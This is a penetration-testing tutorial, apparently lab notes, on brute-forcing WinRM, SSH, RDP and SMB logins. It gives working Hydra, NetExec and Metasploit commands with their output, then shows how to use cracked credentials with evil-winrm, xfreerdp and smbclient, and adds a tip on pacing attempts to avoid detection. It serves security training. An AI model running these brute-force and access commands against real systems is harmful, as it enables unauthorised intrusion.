# Attacking Network Service Logins

## Table of Contents

- [WinRM](#winrm)
  - [NetExec](#netexec)
  - [Evil-WinRM](#evil-winrm)
- [SSH](#ssh)
- [RDP](#rdp)
- [SMB](#smb)

---

## The big picture

Every network has services running to manage files, execute commands, or provide remote access — things like `FTP`, `SMB`, `NFS`, `SSH`, `MySQL/MSSQL`, `RDP`, `WinRM`, `VNC`, `Telnet`, `SMTP`, and `LDAP`. Most of these are protected by a **username + password** login (though some environments lock things down further with key-based auth instead).

If we want remote access to a **Windows** server specifically, the three most common services are:
- **RDP** (full remote desktop)
- **WinRM** (remote command execution)
- **SSH** (less common on Windows, but the standard for Linux)

The rest of this guide walks through each of these, plus `SMB`, and the tools typically used to test their login security.

---

## WinRM

**WinRM** - Windows Remote Management is Microsoft's remote management protocol — it lets you run commands and manage a Windows box over the network using XML-based web services behind the scenes. It must be manually enabled on Windows 10/11, and in secured environments it's often locked down with certificates or specific auth methods. By default it listens on:
- TCP **5985** (HTTP)
- TCP **5986** (HTTPS)

### NetExec

**NetExec** (the modern successor to the older "CrackMapExec") is a Swiss-army-knife tool for testing logins against many protocols at once — SMB, LDAP, MSSQL, WinRM, and more. 

The official documentation is [here](https://www.netexec.wiki/netexec-lab)

General help:
```bash
$ netexec -h
```
```
Available Protocols:
  {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc}
```

You can also get protocol-specific help, e.g.:
```bash
$ netexec smb -h
```

### Basic usage pattern

```bash
$ netexec <protocol> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

**Example — testing WinRM logins:**
```bash
$ netexec winrm 10.129.42.197 -u user.list -p password.list
```
```
WINRM   10.129.42.197   5985   NONE   [+] None\user:password (Pwn3d!)
```

The `(Pwn3d!)` tag is NetExec's way of flagging that this credential pair not only logged in, but is also likely enough to execute commands on the box.

### Evil-WinRM

**Evil-WinRM** is a dedicated client for talking to WinRM efficiently once you have a working username/password.

Connect:
```bash
$ evil-winrm -i <target-IP> -u <username> -p <password>

$ evil-winrm -i 10.129.42.197 -u user -p password
```
```
Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\user\Documents>
```

A successful login drops you into an interactive **PowerShell-based** session on the remote machine.

---

## SSH

SSH is the standard secure way to remotely run commands or transfer files on Linux systems, running on TCP port **22** by default. It combines three cryptographic techniques:

| Technique | What it does |
|-----------|----------------|
| **Symmetric encryption** | Same key encrypts and decrypts — fast, but both sides need the same secret. A safe key-exchange method (Diffie-Hellman) lets the two sides agree on that secret without ever transmitting it directly. |
| **Asymmetric encryption** | A public/private key pair. The private key must stay secret — if an attacker gets hold of an *unprotected* private key, they can log in with no password at all. |
| **Hashing** | Used to verify that messages haven't been tampered with in transit. |

### Brute-forcing SSH logins with Hydra

**Hydra** is a classic tool for testing many username/password combinations against network login services.

```bash
$ hydra -L user.list -P password.list ssh://10.129.42.197
```
```
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

### Logging in manually

Once you have working credentials, just use the normal SSH client that ships with most Linux distros:

```bash
$ ssh user@10.129.42.197
```
```
The authenticity of host '10.129.42.197' can't be established. Continue connecting? yes
user@10.129.42.197's password: ********
Microsoft Windows [Version 10.0.17763.1637]
user@WINSRV C:\Users\user>
```

---

## RDP

**RDP** (Remote Desktop Protocol) is Microsoft's full remote-desktop protocol, running on TCP port **3389** by default. It streams video, audio, keyboard/mouse input, and even supports remote printing and file sharing between the client and server.

### Brute-forcing RDP with Hydra

```bash
$ hydra -L user.list -P password.list rdp://10.129.42.197
```
```
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

> Note: RDP servers often don't handle many simultaneous connection attempts well — it's common to reduce thread count (`-t 1` or `-t 4`) and add delays between attempts so the server doesn't choke or flag the activity.

### Connecting with xfreerdp

Several Linux RDP clients exist (`Remmina`, `xfreerdp`, etc.). Example using `xfreerdp`:

```bash
$ xfreerdp /v:<target-IP> /u:<username> /p:<password>

$ xfreerdp /v:10.129.42.197 /u:user /p:password
```

You may be prompted to trust the server's certificate the first time you connect.

---

## SMB 

**SMB** (Server Message Block) handles file/directory sharing and printing across Windows networks (comparable to what NFS does on Unix/Linux). You'll often see it called **CIFS**, and its open-source implementation is known as **Samba**.

### Brute-forcing SMB with Hydra

```bash
$ hydra -L user.list -P password.list smb://10.129.42.197
```
```
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

Sometimes Hydra fails outright on newer SMB versions:
```
[ERROR] invalid reply from target smb://10.129.42.197:445/
```
This usually means your Hydra build doesn't handle SMBv3 properly. The fix is either to update/recompile Hydra, or switch to another tool entirely — like Metasploit.

### Brute-forcing SMB with Metasploit

```bash
$ msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > run
```
```
[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Checking what you can access with NetExec

Once you have valid credentials, NetExec can enumerate what shares are available and what access level you have on each:

```bash
$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
```
```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                               Default share
SHARENAME       READ,WRITE
IPC$            READ            Remote IPC
```

### Browsing shares with smbclient

`smbclient` lets you interactively browse (and upload/download from, if permitted) a given share:

```bash
$ smbclient -U user \\\\10.129.42.197\\SHARENAME
```
```
Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \>
```

---

## Quick Recap

| Service | Default Port | Brute-force tool(s) | Connect once cracked |
|---------|---------------|------------------------|--------------------------|
| WinRM | 5985 (HTTP) / 5986 (HTTPS) | NetExec | Evil-WinRM |
| SSH | 22 | Hydra | `ssh user@host` |
| RDP | 3389 | Hydra | xfreerdp, Remmina |
| SMB | 445 | Hydra, Metasploit | NetExec (enumerate), smbclient (browse) |

**Key idea:** Most network services still boil down to a username/password check, and the testing workflow is consistent across all of them: pick a tool suited to that protocol, supply a user list and password list, then — once a valid pair is found — switch to the matching client tool to actually interact with the system.
